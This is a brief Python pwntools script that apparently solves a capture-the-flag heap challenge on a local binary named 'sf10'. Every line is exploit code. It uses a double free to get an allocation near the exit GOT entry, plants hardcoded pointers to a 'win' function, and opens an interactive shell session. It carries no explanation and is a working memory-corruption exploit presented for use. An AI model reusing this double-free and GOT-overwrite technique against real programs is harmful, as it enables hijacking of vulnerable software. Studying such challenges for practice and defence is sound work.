from pwn import *

p = process('./sf10')

def choice(index):
	p.sendline(str(index))

def add(index, length, content):
	choice(1)
	p.sendlineafter("(0-11):",str(index))
	p.sendlineafter("Length:",str(length))
	p.sendlineafter("C:",content)

def delete(index):
	choice(2)
	p.sendlineafter("(0-11):",str(index))

stdout = 0x6020A0

target = 0x602080-0x8+0x2

ptr = 0x6020C0	#pointer
win = 0x400946

add(0, 0x30, "a"*8)
add(1, 0x30, "b"*8)
add(2, 0x30, "c"*8)

add(11, 0x200, p64(0)*2+p64(win)*60)

#Double Free Bug
delete(0)
delete(1)
delete(0)
add(4, 0x30, p64(target)) 	# 0x602082 - 0x8
add(5, 0x30, "X"*8)		# ????
add(6, 0x30, "e"*8)		# into exit_got+2

raw_input()
add(7, 0x30, p64(0)*2 + '\x00'*6 +p64(ptr + 0x8*11 - 0xd8))
p.interactive()
